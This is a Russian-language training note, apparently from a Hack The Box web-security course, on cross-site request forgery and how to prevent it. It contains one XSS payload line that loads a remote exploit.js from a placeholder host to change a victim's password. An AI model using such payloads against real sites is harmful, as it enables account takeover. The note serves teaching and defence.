#web #htb 

Третий тип уязвимостей внешнего интерфейса, возникающих из-за нефильтрованного пользовательского ввода, — это [подделка межсайтовых запросов (CSRF)](https://owasp.org/www-community/attacks/csrf). `CSRF` Атаки могут использовать `XSS` уязвимости для выполнения определённых запросов и `API` вызовов в веб-приложении, в котором жертва в данный момент проходит аутентификацию. Это позволит злоумышленнику выполнять действия от имени аутентифицированного пользователя. Для выполнения тех же функций могут использоваться и другие уязвимости, например HTTP-параметры для атак.

Распространённая `CSRF` атака с целью получения привилегированного доступа к веб-приложению заключается в создании `JavaScript` полезной нагрузки, которая автоматически меняет пароль жертвы на значение, установленное злоумышленником. Как только жертва увидит полезную нагрузку на уязвимой странице (например, вредоносный комментарий, содержащий `JavaScript` `CSRF` полезную нагрузку), `JavaScript` код запустится автоматически. Он будет использовать сеанс входа жертвы в систему для изменения пароля. После этого злоумышленник сможет войти в учётную запись жертвы и управлять ею.

`CSRF` Также можно использовать для атаки на администраторов и получения доступа к их учётным записям. Администраторы обычно имеют доступ к конфиденциальным функциям, которые иногда можно использовать для атаки и получения контроля над внутренним сервером (в зависимости от функций, доступных администраторам в конкретном веб-приложении). В этом примере вместо использования `JavaScript` кода, который возвращает файл cookie сеанса, мы загружаем удалённый `.js` (`JavaScript`) файл следующим образом:

Код: html

```html
"><script src=//www.example.com/exploit.js></script>
```

Файл `exploit.js` будет содержать вредоносный `JavaScript` код, который меняет пароль пользователя. Для разработки `exploit.js` в данном случае необходимо знать процедуру смены пароля в этом веб-приложении и `APIs`. Злоумышленнику нужно будет создать `JavaScript` код, который будет воспроизводить нужную функциональность и автоматически выполнять её (то есть `JavaScript` код, который меняет наш пароль для этого конкретного веб-приложения).

---

## Предотвращение

Несмотря на то, что на стороне сервера должны быть предусмотрены меры по обнаружению и фильтрации вводимых пользователем данных, также важно фильтровать и очищать вводимые пользователем данные на стороне клиента до того, как они попадут на сервер, особенно если этот код может отображаться непосредственно на стороне клиента без взаимодействия с сервером. При получении вводимых пользователем данных необходимо применять два основных элемента управления:

|Тип|Описание|
|---|---|
|`Sanitization`|Удаление специальных и нестандартных символов из вводимых пользователем данных перед их отображением или сохранением.|
|`Validation`|Проверка того, что введенные пользователем данные соответствуют ожидаемому формату (например, введенное электронное письмо соответствует формату электронного письма)|

Кроме того, важно очищать отображаемый вывод от любых специальных/нестандартных символов. Если злоумышленнику удастся обойти фильтры очистки и проверки на стороне клиента и на стороне сервера, это не нанесёт никакого вреда клиентской части.

После очистки и/или проверки вводимых пользователем данных и отображаемого вывода мы сможем предотвратить такие атаки, как `HTML Injection` и `XSS`. Другим решением может стать внедрение [брандмауэра веб-приложений (WAF)](https://en.wikipedia.org/wiki/Web_application_firewall), который поможет автоматически предотвращать попытки внедрения. Однако следует отметить, что брандмауэры WAF можно обойти, поэтому разработчикам следует придерживаться лучших практик программирования и не полагаться полностью на устройство для обнаружения/блокировки атак.

Для защиты от `XSS` в современных браузерах есть встроенные средства защиты, которые блокируют автоматическое выполнение кода Javascript. В случае с `CSRF` большинство современных веб-приложений используют механизмы защиты от CSRF-атак, например требуют уникальный токен для каждого сеанса или запроса. Кроме того, средства защиты на уровне HTTP, такие как атрибут `SameSite` cookie (`SameSite=Strict` или `Lax`), могут запретить браузерам включать файлы cookie для аутентификации в запросы с разных источников. Функциональные средства защиты, например требование ввести пароль перед его изменением, также могут помочь снизить риск CSRF-атак. Несмотря на эти меры безопасности, в определенных сценариях их все еще можно обойти. В результате такие уязвимости, как XSS и CSRF, продолжают представлять значительный риск для пользователей веб-приложений. Эти средства защиты следует рассматривать как дополнительные уровни защиты, а не как основные гарантии — разработчики должны убедиться, что их приложения безопасны по своей конструкции и по своей сути не уязвимы для подобных атак.

В этом [руководстве по предотвращению подделки межсайтовых запросов](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html) от OWASP более подробно рассматриваются атаки и меры по их предотвращению.